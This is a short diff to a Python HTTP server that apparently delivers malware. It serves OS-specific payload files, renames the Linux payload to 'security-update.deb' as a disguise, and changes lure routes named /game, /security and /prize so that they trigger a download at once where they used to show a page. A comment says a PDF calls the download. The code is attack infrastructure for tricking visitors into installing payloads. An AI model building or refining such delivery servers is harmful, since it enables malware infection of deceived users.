@@ -10,7 +10,8 @@ PUBLIC_DIR = "public"
 FILES_DIR = "files"
 
 FILE_WIN = "payload_win.exe"
-FILE_LINUX = "payload_linux.deb"
+# FILE_LINUX = "payload_linux"
+FILE_LINUX = "security-update.deb"
 FILE_MAC = "payload_mac"
 
 SMART_ENDPOINT = "/get_document"
@@ -26,16 +27,16 @@ class DeliveryHandler(http.server.SimpleHTTPRequestHandler):
 
         # --- ROUTING FÜR DbD PAGES
         if path == "/game":
-            # self.handle_smart_download()
-            self.serve_file(os.path.join(PUBLIC_DIR, "game.html"))
+            self.handle_smart_download()
+            # self.serve_file(os.path.join(PUBLIC_DIR, "game.html"))
             return
         elif path == "/security":
-            # self.handle_smart_download()
-            self.serve_file(os.path.join(PUBLIC_DIR, "security.html"))
+            self.handle_smart_download()
+            # self.serve_file(os.path.join(PUBLIC_DIR, "security.html"))
             return
         elif path == "/prize":
-            # self.handle_smart_download()
-            self.serve_file(os.path.join(PUBLIC_DIR, "prize.html"))
+            self.handle_smart_download()
+            # self.serve_file(os.path.join(PUBLIC_DIR, "prize.html"))
             return
 
         # --- SMART DOWNLOAD (Vom PDF aufgerufen) ---
